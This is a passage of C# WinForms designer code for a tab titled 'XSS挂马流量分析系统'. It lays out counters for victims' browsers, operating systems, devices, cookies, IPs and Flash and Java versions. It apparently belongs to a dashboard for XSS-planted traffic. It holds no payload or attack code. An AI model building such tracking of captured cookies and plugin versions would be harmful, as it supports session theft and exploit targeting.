            this.tab_XssAnalysis.Location = new System.Drawing.Point(4, 4);
            this.tab_XssAnalysis.Name = "tab_XssAnalysis";
            this.tab_XssAnalysis.Size = new System.Drawing.Size(980, 623);
            this.tab_XssAnalysis.TabIndex = 12;
            this.tab_XssAnalysis.Text = "XssAnalysis";
            this.tab_XssAnalysis.UseVisualStyleBackColor = true;
            // 
            // label26
            // 
            this.label26.AutoSize = true;
            this.label26.Font = new System.Drawing.Font("SimSun", 18F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(134)));
            this.label26.Location = new System.Drawing.Point(357, 12);
            this.label26.Name = "label26";
            this.label26.Size = new System.Drawing.Size(238, 24);
            this.label26.TabIndex = 160;
            this.label26.Text = "XSS挂马流量分析系统";
            // 
            // gb_xssAnalysis
            // 
            this.gb_xssAnalysis.Controls.Add(this.comboBox10);
            this.gb_xssAnalysis.Controls.Add(this.comboBox11);
            this.gb_xssAnalysis.Controls.Add(this.comboBox9);
            this.gb_xssAnalysis.Controls.Add(this.comboBox8);
            this.gb_xssAnalysis.Controls.Add(this.comboBox7);
            this.gb_xssAnalysis.Controls.Add(this.comboBox6);
            this.gb_xssAnalysis.Controls.Add(this.lbl_OtherMobileCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_OtherIECount);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox47);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox48);
            this.gb_xssAnalysis.Controls.Add(this.lbl_BlackBerryCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_SAMSUNGCount);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox35);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox45);
            this.gb_xssAnalysis.Controls.Add(this.lbl_NokiaCount);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox46);
            this.gb_xssAnalysis.Controls.Add(this.lbl_WinPhoneCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_AndroidCount);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox37);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox38);
            this.gb_xssAnalysis.Controls.Add(this.lbl_iPadCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_iPhoneCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_BSDCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_UnixCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_LinuxCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_MACCount);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox39);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox40);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox41);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox42);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox43);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox44);
            this.gb_xssAnalysis.Controls.Add(this.lbl_Win2000Count);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox36);
            this.gb_xssAnalysis.Controls.Add(this.lbl_WinXPCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_Win2003Count);
            this.gb_xssAnalysis.Controls.Add(this.lbl_Win7Count);
            this.gb_xssAnalysis.Controls.Add(this.lbl_Win8Count);
            this.gb_xssAnalysis.Controls.Add(this.lbl_Win81Count);
            this.gb_xssAnalysis.Controls.Add(this.lbl_Win10Count);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox29);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox30);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox31);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox32);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox33);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox34);
            this.gb_xssAnalysis.Controls.Add(this.lbl_NetscapeCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_UCWEBCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_OperaCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_SafariCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_ChromeCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_FirefoxCount);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox23);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox24);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox25);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox26);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox27);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox28);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox22);
            this.gb_xssAnalysis.Controls.Add(this.lbl_XssIPcount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_XssCookieCount);
            this.gb_xssAnalysis.Controls.Add(this.lbl_IE11count);
            this.gb_xssAnalysis.Controls.Add(this.lbl_IE10count);
            this.gb_xssAnalysis.Controls.Add(this.lbl_IE9count);
            this.gb_xssAnalysis.Controls.Add(this.lbl_IE8count);
            this.gb_xssAnalysis.Controls.Add(this.lbl_IE7count);
            this.gb_xssAnalysis.Controls.Add(this.lbl_IE6count);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox20);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox21);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox18);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox19);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox17);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox16);
            this.gb_xssAnalysis.Controls.Add(this.pictureBox15);
            this.gb_xssAnalysis.Controls.Add(this.lbl_XssInfo);
            this.gb_xssAnalysis.Controls.Add(this.comboBox3);
            this.gb_xssAnalysis.Controls.Add(this.label25);
            this.gb_xssAnalysis.Controls.Add(this.comboBox2);
            this.gb_xssAnalysis.Controls.Add(this.btn_OpenXssDB);
            this.gb_xssAnalysis.Location = new System.Drawing.Point(3, 39);
            this.gb_xssAnalysis.Name = "gb_xssAnalysis";
            this.gb_xssAnalysis.Size = new System.Drawing.Size(974, 581);
            this.gb_xssAnalysis.TabIndex = 12;
            this.gb_xssAnalysis.TabStop = false;
            // 
            // comboBox10
            // 
            this.comboBox10.FormattingEnabled = true;
            this.comboBox10.Location = new System.Drawing.Point(669, 20);
            this.comboBox10.Name = "comboBox10";
            this.comboBox10.Size = new System.Drawing.Size(79, 20);
            this.comboBox10.TabIndex = 159;
            this.comboBox10.Text = "开始日期";
            // 
            // comboBox11
            // 
            this.comboBox11.FormattingEnabled = true;
            this.comboBox11.Location = new System.Drawing.Point(764, 20);
            this.comboBox11.Name = "comboBox11";
            this.comboBox11.Size = new System.Drawing.Size(80, 20);
            this.comboBox11.TabIndex = 158;
            this.comboBox11.Text = "结束日期";
            // 
            // comboBox9
            // 
            this.comboBox9.FormattingEnabled = true;
            this.comboBox9.Location = new System.Drawing.Point(559, 20);
            this.comboBox9.Name = "comboBox9";
            this.comboBox9.Size = new System.Drawing.Size(80, 20);
            this.comboBox9.TabIndex = 157;
            this.comboBox9.Text = "Java版本";
            // 
            // comboBox8
            // 
            this.comboBox8.FormattingEnabled = true;
            this.comboBox8.Location = new System.Drawing.Point(463, 20);
            this.comboBox8.Name = "comboBox8";
            this.comboBox8.Size = new System.Drawing.Size(80, 20);
            this.comboBox8.TabIndex = 156;
            this.comboBox8.Text = "Flash版本";
            // 
            // comboBox7
            // 
            this.comboBox7.FormattingEnabled = true;
            this.comboBox7.Location = new System.Drawing.Point(271, 20);
            this.comboBox7.Name = "comboBox7";
            this.comboBox7.Size = new System.Drawing.Size(80, 20);
            this.comboBox7.TabIndex = 155;
            this.comboBox7.Text = "IP或IP段";
            // 
            // comboBox6
            // 
            this.comboBox6.FormattingEnabled = true;
            this.comboBox6.Location = new System.Drawing.Point(367, 20);
            this.comboBox6.Name = "comboBox6";
            this.comboBox6.Size = new System.Drawing.Size(80, 20);
            this.comboBox6.TabIndex = 154;
            this.comboBox6.Text = "系统语言";
            // 
            // lbl_OtherMobileCount
            // 
            this.lbl_OtherMobileCount.AutoSize = true;
            this.lbl_OtherMobileCount.Location = new System.Drawing.Point(466, 476);
            this.lbl_OtherMobileCount.Name = "lbl_OtherMobileCount";
            this.lbl_OtherMobileCount.Size = new System.Drawing.Size(77, 12);
            this.lbl_OtherMobileCount.TabIndex = 151;
            this.lbl_OtherMobileCount.Text = "其它操作系统";
            // 
            // lbl_OtherIECount
            // 
            this.lbl_OtherIECount.AutoSize = true;
            this.lbl_OtherIECount.Location = new System.Drawing.Point(466, 454);
            this.lbl_OtherIECount.Name = "lbl_OtherIECount";
            this.lbl_OtherIECount.Size = new System.Drawing.Size(65, 12);
            this.lbl_OtherIECount.TabIndex = 150;
            this.lbl_OtherIECount.Text = "其它浏览器";
            // 
            // pictureBox47
            // 
            this.pictureBox47.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox47.Image")));
            this.pictureBox47.Location = new System.Drawing.Point(446, 476);
            this.pictureBox47.Name = "pictureBox47";
            this.pictureBox47.Size = new System.Drawing.Size(16, 16);
            this.pictureBox47.TabIndex = 149;
            this.pictureBox47.TabStop = false;
            // 
            // pictureBox48
            // 
            this.pictureBox48.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox48.Image")));
            this.pictureBox48.Location = new System.Drawing.Point(446, 454);
            this.pictureBox48.Name = "pictureBox48";
            this.pictureBox48.Size = new System.Drawing.Size(16, 16);
            this.pictureBox48.TabIndex = 148;
            this.pictureBox48.TabStop = false;
            // 
            // lbl_BlackBerryCount
            // 
            this.lbl_BlackBerryCount.AutoSize = true;
            this.lbl_BlackBerryCount.Location = new System.Drawing.Point(468, 417);
            this.lbl_BlackBerryCount.Name = "lbl_BlackBerryCount";
            this.lbl_BlackBerryCount.Size = new System.Drawing.Size(65, 12);
            this.lbl_BlackBerryCount.TabIndex = 147;
            this.lbl_BlackBerryCount.Text = "BlackBerry";
            // 
            // lbl_SAMSUNGCount
            // 
            this.lbl_SAMSUNGCount.AutoSize = true;
            this.lbl_SAMSUNGCount.Location = new System.Drawing.Point(468, 395);
            this.lbl_SAMSUNGCount.Name = "lbl_SAMSUNGCount";
            this.lbl_SAMSUNGCount.Size = new System.Drawing.Size(47, 12);
            this.lbl_SAMSUNGCount.TabIndex = 146;
            this.lbl_SAMSUNGCount.Text = "SAMSUNG";
            // 
            // pictureBox35
            // 
            this.pictureBox35.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox35.Image")));
            this.pictureBox35.Location = new System.Drawing.Point(448, 417);
            this.pictureBox35.Name = "pictureBox35";
            this.pictureBox35.Size = new System.Drawing.Size(16, 16);
            this.pictureBox35.TabIndex = 145;
            this.pictureBox35.TabStop = false;
            // 
            // pictureBox45
            // 
            this.pictureBox45.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox45.Image")));
            this.pictureBox45.Location = new System.Drawing.Point(448, 395);
            this.pictureBox45.Name = "pictureBox45";
            this.pictureBox45.Size = new System.Drawing.Size(16, 16);
            this.pictureBox45.TabIndex = 144;
            this.pictureBox45.TabStop = false;
            // 
            // lbl_NokiaCount
            // 
            this.lbl_NokiaCount.AutoSize = true;
            this.lbl_NokiaCount.Location = new System.Drawing.Point(468, 369);
            this.lbl_NokiaCount.Name = "lbl_NokiaCount";
            this.lbl_NokiaCount.Size = new System.Drawing.Size(35, 12);
            this.lbl_NokiaCount.TabIndex = 143;
            this.lbl_NokiaCount.Text = "Nokia";
            // 
            // pictureBox46
            // 
            this.pictureBox46.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox46.Image")));
            this.pictureBox46.Location = new System.Drawing.Point(448, 369);
            this.pictureBox46.Name = "pictureBox46";
            this.pictureBox46.Size = new System.Drawing.Size(16, 16);
            this.pictureBox46.TabIndex = 142;
            this.pictureBox46.TabStop = false;
            // 
            // lbl_WinPhoneCount
            // 
            this.lbl_WinPhoneCount.AutoSize = true;
            this.lbl_WinPhoneCount.Location = new System.Drawing.Point(466, 344);
            this.lbl_WinPhoneCount.Name = "lbl_WinPhoneCount";
            this.lbl_WinPhoneCount.Size = new System.Drawing.Size(53, 12);
            this.lbl_WinPhoneCount.TabIndex = 141;
            this.lbl_WinPhoneCount.Text = "WinPhone";
            // 
            // lbl_AndroidCount
            // 
            this.lbl_AndroidCount.AutoSize = true;
            this.lbl_AndroidCount.Location = new System.Drawing.Point(466, 322);
            this.lbl_AndroidCount.Name = "lbl_AndroidCount";
            this.lbl_AndroidCount.Size = new System.Drawing.Size(47, 12);
            this.lbl_AndroidCount.TabIndex = 140;
            this.lbl_AndroidCount.Text = "Android";
            // 
            // pictureBox37
            // 
            this.pictureBox37.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox37.Image")));
            this.pictureBox37.Location = new System.Drawing.Point(446, 344);
            this.pictureBox37.Name = "pictureBox37";
            this.pictureBox37.Size = new System.Drawing.Size(16, 16);
            this.pictureBox37.TabIndex = 139;
            this.pictureBox37.TabStop = false;
            // 
            // pictureBox38
            // 
            this.pictureBox38.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox38.Image")));
            this.pictureBox38.Location = new System.Drawing.Point(446, 322);
            this.pictureBox38.Name = "pictureBox38";
            this.pictureBox38.Size = new System.Drawing.Size(16, 16);
            this.pictureBox38.TabIndex = 138;
            this.pictureBox38.TabStop = false;
            // 
            // lbl_iPadCount
            // 
            this.lbl_iPadCount.AutoSize = true;
            this.lbl_iPadCount.Location = new System.Drawing.Point(466, 296);
            this.lbl_iPadCount.Name = "lbl_iPadCount";
            this.lbl_iPadCount.Size = new System.Drawing.Size(29, 12);
            this.lbl_iPadCount.TabIndex = 137;
            this.lbl_iPadCount.Text = "iPad";
            // 
            // lbl_iPhoneCount
            // 
            this.lbl_iPhoneCount.AutoSize = true;
            this.lbl_iPhoneCount.Location = new System.Drawing.Point(466, 274);
            this.lbl_iPhoneCount.Name = "lbl_iPhoneCount";
            this.lbl_iPhoneCount.Size = new System.Drawing.Size(41, 12);
            this.lbl_iPhoneCount.TabIndex = 136;
            this.lbl_iPhoneCount.Text = "iPhone";
            // 
            // lbl_BSDCount
            // 
            this.lbl_BSDCount.AutoSize = true;
            this.lbl_BSDCount.Location = new System.Drawing.Point(33, 498);
            this.lbl_BSDCount.Name = "lbl_BSDCount";
            this.lbl_BSDCount.Size = new System.Drawing.Size(23, 12);
            this.lbl_BSDCount.TabIndex = 135;
            this.lbl_BSDCount.Text = "BSD";
            // 
            // lbl_UnixCount
            // 
            this.lbl_UnixCount.AutoSize = true;
            this.lbl_UnixCount.Location = new System.Drawing.Point(33, 476);
            this.lbl_UnixCount.Name = "lbl_UnixCount";
            this.lbl_UnixCount.Size = new System.Drawing.Size(29, 12);
            this.lbl_UnixCount.TabIndex = 134;
            this.lbl_UnixCount.Text = "Unix";
            // 
            // lbl_LinuxCount
            // 
            this.lbl_LinuxCount.AutoSize = true;
            this.lbl_LinuxCount.Location = new System.Drawing.Point(33, 454);
            this.lbl_LinuxCount.Name = "lbl_LinuxCount";
            this.lbl_LinuxCount.Size = new System.Drawing.Size(35, 12);
            this.lbl_LinuxCount.TabIndex = 133;
            this.lbl_LinuxCount.Text = "Linux";
            // 
            // lbl_MACCount
            // 
            this.lbl_MACCount.AutoSize = true;
            this.lbl_MACCount.Location = new System.Drawing.Point(33, 432);
            this.lbl_MACCount.Name = "lbl_MACCount";
            this.lbl_MACCount.Size = new System.Drawing.Size(59, 12);
            this.lbl_MACCount.TabIndex = 132;
            this.lbl_MACCount.Text = "MAC(苹果)";
            // 
            // pictureBox39
            // 
            this.pictureBox39.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox39.Image")));
            this.pictureBox39.Location = new System.Drawing.Point(446, 296);
            this.pictureBox39.Name = "pictureBox39";
            this.pictureBox39.Size = new System.Drawing.Size(16, 16);
            this.pictureBox39.TabIndex = 131;
            this.pictureBox39.TabStop = false;
            // 
            // pictureBox40
            // 
            this.pictureBox40.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox40.Image")));
            this.pictureBox40.Location = new System.Drawing.Point(446, 274);
            this.pictureBox40.Name = "pictureBox40";
            this.pictureBox40.Size = new System.Drawing.Size(16, 16);
            this.pictureBox40.TabIndex = 130;
            this.pictureBox40.TabStop = false;
            // 
            // pictureBox41
            // 
            this.pictureBox41.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox41.Image")));
            this.pictureBox41.Location = new System.Drawing.Point(11, 498);
            this.pictureBox41.Name = "pictureBox41";
            this.pictureBox41.Size = new System.Drawing.Size(16, 16);
            this.pictureBox41.TabIndex = 129;
            this.pictureBox41.TabStop = false;
            // 
            // pictureBox42
            // 
            this.pictureBox42.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox42.Image")));
            this.pictureBox42.Location = new System.Drawing.Point(11, 476);
            this.pictureBox42.Name = "pictureBox42";
            this.pictureBox42.Size = new System.Drawing.Size(16, 16);
            this.pictureBox42.TabIndex = 128;
            this.pictureBox42.TabStop = false;
            // 
            // pictureBox43
            // 
            this.pictureBox43.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox43.Image")));
            this.pictureBox43.Location = new System.Drawing.Point(11, 454);
            this.pictureBox43.Name = "pictureBox43";
            this.pictureBox43.Size = new System.Drawing.Size(16, 16);
            this.pictureBox43.TabIndex = 127;
            this.pictureBox43.TabStop = false;
            // 
            // pictureBox44
            // 
            this.pictureBox44.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox44.Image")));
            this.pictureBox44.Location = new System.Drawing.Point(11, 432);
            this.pictureBox44.Name = "pictureBox44";
            this.pictureBox44.Size = new System.Drawing.Size(16, 16);
            this.pictureBox44.TabIndex = 126;
            this.pictureBox44.TabStop = false;
            // 
            // lbl_Win2000Count
            // 
            this.lbl_Win2000Count.AutoSize = true;
            this.lbl_Win2000Count.Location = new System.Drawing.Point(33, 384);
            this.lbl_Win2000Count.Name = "lbl_Win2000Count";
            this.lbl_Win2000Count.Size = new System.Drawing.Size(47, 12);
            this.lbl_Win2000Count.TabIndex = 124;
            this.lbl_Win2000Count.Text = "Win2000";
            // 
            // pictureBox36
            // 
            this.pictureBox36.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox36.Image")));
            this.pictureBox36.Location = new System.Drawing.Point(11, 384);
            this.pictureBox36.Name = "pictureBox36";
            this.pictureBox36.Size = new System.Drawing.Size(16, 16);
            this.pictureBox36.TabIndex = 122;
            this.pictureBox36.TabStop = false;
            // 
            // lbl_WinXPCount
            // 
            this.lbl_WinXPCount.AutoSize = true;
            this.lbl_WinXPCount.Location = new System.Drawing.Point(33, 358);
            this.lbl_WinXPCount.Name = "lbl_WinXPCount";
            this.lbl_WinXPCount.Size = new System.Drawing.Size(35, 12);
            this.lbl_WinXPCount.TabIndex = 121;
            this.lbl_WinXPCount.Text = "WinXP";
            // 
            // lbl_Win2003Count
            // 
            this.lbl_Win2003Count.AutoSize = true;
            this.lbl_Win2003Count.Location = new System.Drawing.Point(33, 336);
            this.lbl_Win2003Count.Name = "lbl_Win2003Count";
            this.lbl_Win2003Count.Size = new System.Drawing.Size(47, 12);
            this.lbl_Win2003Count.TabIndex = 120;
            this.lbl_Win2003Count.Text = "Win2003";
            // 
            // lbl_Win7Count
            // 
            this.lbl_Win7Count.AutoSize = true;
            this.lbl_Win7Count.Location = new System.Drawing.Point(33, 314);
            this.lbl_Win7Count.Name = "lbl_Win7Count";
            this.lbl_Win7Count.Size = new System.Drawing.Size(59, 12);
            this.lbl_Win7Count.TabIndex = 119;
            this.lbl_Win7Count.Text = "Win7/2008";
            // 
            // lbl_Win8Count
            // 
            this.lbl_Win8Count.AutoSize = true;
            this.lbl_Win8Count.Location = new System.Drawing.Point(33, 292);
            this.lbl_Win8Count.Name = "lbl_Win8Count";
            this.lbl_Win8Count.Size = new System.Drawing.Size(59, 12);
            this.lbl_Win8Count.TabIndex = 118;
            this.lbl_Win8Count.Text = "Win8/2012";
            // 
            // lbl_Win81Count
            // 
            this.lbl_Win81Count.AutoSize = true;
            this.lbl_Win81Count.Location = new System.Drawing.Point(33, 270);
            this.lbl_Win81Count.Name = "lbl_Win81Count";
            this.lbl_Win81Count.Size = new System.Drawing.Size(41, 12);
            this.lbl_Win81Count.TabIndex = 117;
            this.lbl_Win81Count.Text = "Win8.1";
            // 
            // lbl_Win10Count
            // 
            this.lbl_Win10Count.AutoSize = true;
            this.lbl_Win10Count.Location = new System.Drawing.Point(33, 248);
            this.lbl_Win10Count.Name = "lbl_Win10Count";
            this.lbl_Win10Count.Size = new System.Drawing.Size(35, 12);
            this.lbl_Win10Count.TabIndex = 116;
            this.lbl_Win10Count.Text = "Win10";
            // 
            // pictureBox29
            // 
            this.pictureBox29.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox29.Image")));
            this.pictureBox29.Location = new System.Drawing.Point(11, 358);
            this.pictureBox29.Name = "pictureBox29";
            this.pictureBox29.Size = new System.Drawing.Size(16, 16);
            this.pictureBox29.TabIndex = 115;
            this.pictureBox29.TabStop = false;
            // 
            // pictureBox30
            // 
            this.pictureBox30.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox30.Image")));
            this.pictureBox30.Location = new System.Drawing.Point(11, 336);
            this.pictureBox30.Name = "pictureBox30";
            this.pictureBox30.Size = new System.Drawing.Size(16, 16);
            this.pictureBox30.TabIndex = 114;
            this.pictureBox30.TabStop = false;
            // 
            // pictureBox31
            // 
            this.pictureBox31.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox31.Image")));
            this.pictureBox31.Location = new System.Drawing.Point(11, 314);
            this.pictureBox31.Name = "pictureBox31";
            this.pictureBox31.Size = new System.Drawing.Size(16, 16);
            this.pictureBox31.TabIndex = 113;
            this.pictureBox31.TabStop = false;
            // 
            // pictureBox32
            // 
            this.pictureBox32.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox32.Image")));
            this.pictureBox32.Location = new System.Drawing.Point(11, 292);
            this.pictureBox32.Name = "pictureBox32";
            this.pictureBox32.Size = new System.Drawing.Size(16, 16);
            this.pictureBox32.TabIndex = 112;
            this.pictureBox32.TabStop = false;
            // 
            // pictureBox33
            // 
            this.pictureBox33.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox33.Image")));
            this.pictureBox33.Location = new System.Drawing.Point(11, 270);
            this.pictureBox33.Name = "pictureBox33";
            this.pictureBox33.Size = new System.Drawing.Size(16, 16);
            this.pictureBox33.TabIndex = 111;
            this.pictureBox33.TabStop = false;
            // 
            // pictureBox34
            // 
            this.pictureBox34.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox34.Image")));
            this.pictureBox34.Location = new System.Drawing.Point(11, 248);
            this.pictureBox34.Name = "pictureBox34";
            this.pictureBox34.Size = new System.Drawing.Size(16, 16);
            this.pictureBox34.TabIndex = 110;
            this.pictureBox34.TabStop = false;
            // 
            // lbl_NetscapeCount
            // 
            this.lbl_NetscapeCount.AutoSize = true;
            this.lbl_NetscapeCount.Location = new System.Drawing.Point(466, 196);
            this.lbl_NetscapeCount.Name = "lbl_NetscapeCount";
            this.lbl_NetscapeCount.Size = new System.Drawing.Size(53, 12);
            this.lbl_NetscapeCount.TabIndex = 109;
            this.lbl_NetscapeCount.Text = "Netscape";
            // 
            // lbl_UCWEBCount
            // 
            this.lbl_UCWEBCount.AutoSize = true;
            this.lbl_UCWEBCount.Location = new System.Drawing.Point(466, 174);
            this.lbl_UCWEBCount.Name = "lbl_UCWEBCount";
            this.lbl_UCWEBCount.Size = new System.Drawing.Size(53, 12);
            this.lbl_UCWEBCount.TabIndex = 108;
            this.lbl_UCWEBCount.Text = "   UCWEB";
            // 
            // lbl_OperaCount
            // 
            this.lbl_OperaCount.AutoSize = true;
            this.lbl_OperaCount.Location = new System.Drawing.Point(466, 152);
            this.lbl_OperaCount.Name = "lbl_OperaCount";
            this.lbl_OperaCount.Size = new System.Drawing.Size(53, 12);
            this.lbl_OperaCount.TabIndex = 107;
            this.lbl_OperaCount.Text = "   Opera";
            // 
            // lbl_SafariCount
            // 
            this.lbl_SafariCount.AutoSize = true;
            this.lbl_SafariCount.Location = new System.Drawing.Point(466, 130);
            this.lbl_SafariCount.Name = "lbl_SafariCount";
            this.lbl_SafariCount.Size = new System.Drawing.Size(59, 12);
            this.lbl_SafariCount.TabIndex = 106;
            this.lbl_SafariCount.Text = "   Safari";
            // 
            // lbl_ChromeCount
            // 
            this.lbl_ChromeCount.AutoSize = true;
            this.lbl_ChromeCount.Location = new System.Drawing.Point(466, 108);
            this.lbl_ChromeCount.Name = "lbl_ChromeCount";
            this.lbl_ChromeCount.Size = new System.Drawing.Size(59, 12);
            this.lbl_ChromeCount.TabIndex = 105;
            this.lbl_ChromeCount.Text = "   Chrome";
            // 
            // lbl_FirefoxCount
            // 
            this.lbl_FirefoxCount.AutoSize = true;
            this.lbl_FirefoxCount.Location = new System.Drawing.Point(466, 86);
            this.lbl_FirefoxCount.Name = "lbl_FirefoxCount";
            this.lbl_FirefoxCount.Size = new System.Drawing.Size(59, 12);
            this.lbl_FirefoxCount.TabIndex = 104;
            this.lbl_FirefoxCount.Text = "  Firefox";
            // 
            // pictureBox23
            // 
            this.pictureBox23.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox23.Image")));
            this.pictureBox23.Location = new System.Drawing.Point(444, 196);
            this.pictureBox23.Name = "pictureBox23";
            this.pictureBox23.Size = new System.Drawing.Size(16, 16);
            this.pictureBox23.TabIndex = 103;
            this.pictureBox23.TabStop = false;
            // 
            // pictureBox24
            // 
            this.pictureBox24.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox24.Image")));
            this.pictureBox24.Location = new System.Drawing.Point(444, 174);
            this.pictureBox24.Name = "pictureBox24";
            this.pictureBox24.Size = new System.Drawing.Size(16, 16);
            this.pictureBox24.TabIndex = 102;
            this.pictureBox24.TabStop = false;
            // 
            // pictureBox25
            // 
            this.pictureBox25.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox25.Image")));
            this.pictureBox25.Location = new System.Drawing.Point(444, 152);
            this.pictureBox25.Name = "pictureBox25";
            this.pictureBox25.Size = new System.Drawing.Size(16, 16);
            this.pictureBox25.TabIndex = 101;
            this.pictureBox25.TabStop = false;
            // 
            // pictureBox26
            // 
            this.pictureBox26.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox26.Image")));
            this.pictureBox26.Location = new System.Drawing.Point(444, 130);
            this.pictureBox26.Name = "pictureBox26";
            this.pictureBox26.Size = new System.Drawing.Size(16, 16);
            this.pictureBox26.TabIndex = 100;
            this.pictureBox26.TabStop = false;
            // 
            // pictureBox27
            // 
            this.pictureBox27.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox27.Image")));
            this.pictureBox27.Location = new System.Drawing.Point(444, 108);
            this.pictureBox27.Name = "pictureBox27";
            this.pictureBox27.Size = new System.Drawing.Size(16, 16);
            this.pictureBox27.TabIndex = 99;
            this.pictureBox27.TabStop = false;
            // 
            // pictureBox28
            // 
            this.pictureBox28.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox28.Image")));
            this.pictureBox28.Location = new System.Drawing.Point(444, 86);
            this.pictureBox28.Name = "pictureBox28";
            this.pictureBox28.Size = new System.Drawing.Size(16, 16);
            this.pictureBox28.TabIndex = 98;
            this.pictureBox28.TabStop = false;
            // 
            // pictureBox22
            // 
            this.pictureBox22.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox22.Image")));
            this.pictureBox22.Location = new System.Drawing.Point(203, 53);
            this.pictureBox22.Name = "pictureBox22";
            this.pictureBox22.Size = new System.Drawing.Size(16, 16);
            this.pictureBox22.TabIndex = 97;
            this.pictureBox22.TabStop = false;
            // 
            // lbl_XssIPcount
            // 
            this.lbl_XssIPcount.AutoSize = true;
            this.lbl_XssIPcount.Location = new System.Drawing.Point(225, 53);
            this.lbl_XssIPcount.Name = "lbl_XssIPcount";
            this.lbl_XssIPcount.Size = new System.Drawing.Size(47, 12);
            this.lbl_XssIPcount.TabIndex = 96;
            this.lbl_XssIPcount.Text = "IPcount";
            // 
            // lbl_XssCookieCount
            // 
            this.lbl_XssCookieCount.AutoSize = true;
            this.lbl_XssCookieCount.Location = new System.Drawing.Point(117, 53);
            this.lbl_XssCookieCount.Name = "lbl_XssCookieCount";
            this.lbl_XssCookieCount.Size = new System.Drawing.Size(47, 12);
            this.lbl_XssCookieCount.TabIndex = 95;
            this.lbl_XssCookieCount.Text = "Cookie:";
            // 
            // lbl_IE11count
            // 
            this.lbl_IE11count.AutoSize = true;
            this.lbl_IE11count.Location = new System.Drawing.Point(33, 196);
            this.lbl_IE11count.Name = "lbl_IE11count";
            this.lbl_IE11count.Size = new System.Drawing.Size(29, 12);
            this.lbl_IE11count.TabIndex = 94;
            this.lbl_IE11count.Text = "IE11";
            // 
            // lbl_IE10count
            // 
            this.lbl_IE10count.AutoSize = true;
            this.lbl_IE10count.Location = new System.Drawing.Point(33, 174);
            this.lbl_IE10count.Name = "lbl_IE10count";
            this.lbl_IE10count.Size = new System.Drawing.Size(29, 12);
            this.lbl_IE10count.TabIndex = 93;
            this.lbl_IE10count.Text = "IE10";
            // 
            // lbl_IE9count
            // 
            this.lbl_IE9count.AutoSize = true;
            this.lbl_IE9count.Location = new System.Drawing.Point(33, 152);
            this.lbl_IE9count.Name = "lbl_IE9count";
            this.lbl_IE9count.Size = new System.Drawing.Size(29, 12);
            this.lbl_IE9count.TabIndex = 92;
            this.lbl_IE9count.Text = " IE9";
            // 
            // lbl_IE8count
            // 
            this.lbl_IE8count.AutoSize = true;
            this.lbl_IE8count.Location = new System.Drawing.Point(33, 130);
            this.lbl_IE8count.Name = "lbl_IE8count";
            this.lbl_IE8count.Size = new System.Drawing.Size(29, 12);
